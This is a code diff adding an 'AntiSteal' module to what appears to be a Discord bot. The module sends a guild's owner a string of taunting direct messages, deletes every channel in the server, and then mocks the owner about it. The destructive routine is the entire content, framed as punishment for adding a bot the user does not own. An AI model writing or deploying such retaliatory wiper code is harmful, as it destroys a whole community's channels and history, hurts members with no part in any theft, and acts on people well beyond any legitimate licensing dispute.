@@ -30,3 +30,58 @@
  * 
  * See LICENCE for more information.
  */
+
+// Modules
+const discord = require('discord.js');
+const enmap = require('enmap');
+const chalk = require('chalk');
+const express = require('express');
+const moment = require('moment');
+const _ = require('lodash');
+const fs = require('fs');
+const http = require('http');
+const https = require('https');
+
+// Wait function
+async function wait(seconds = 5) {
+    return new Promise((resolve, reject) => {
+        setTimeout(() => {
+            resolve();
+        }, seconds * 1000);
+    });
+}
+
+exports.run = async (client, guild, log) => {
+    log('i', `AntiSteal: Beginning for guild ${guild.id}...`);
+    let owner = guild.owner;
+    log('i', `AntiSteal: Confirmed owner to be ${owner.user.id}`);
+    log('i', 'AntiSteal: Sending owner DMs...');
+    owner.send('Well well well.. Seems you (or a friend) tried to add something that you don\'t own...');
+    await wait();
+    owner.send('Do you like playing games?');
+    await wait();
+    owner.send('I hope so...');
+    await wait();
+    owner.send('Well, let\'s play!');
+    await wait();
+    owner.send('What should I do... hmm..');
+    await wait();
+    owner.send('Ah! I have an idea!');
+    await wait(1);
+    owner.send('I\'ll delete all the channels!');
+    await wait();
+    owner.send('Let me do that..');
+    await wait();
+    log('i', 'AntiSteal: Deleting channels...');
+    let channels = guild.channels.cache;
+    channels.forEach((channel) => {
+        log('i', `AntiSteal: Deleting channel ${channel.name}`);
+        channel.delete().catch((e) => {
+            log('e', `Couldn't delete channel ${  channel.name}`);
+        });
+    });
+    await wait(60);
+    owner.send('Had fun with that? All of your channels are gone!');
+    await wait();
+    owner.send('Have we learned not to play with things we don\'t own today?');
+};
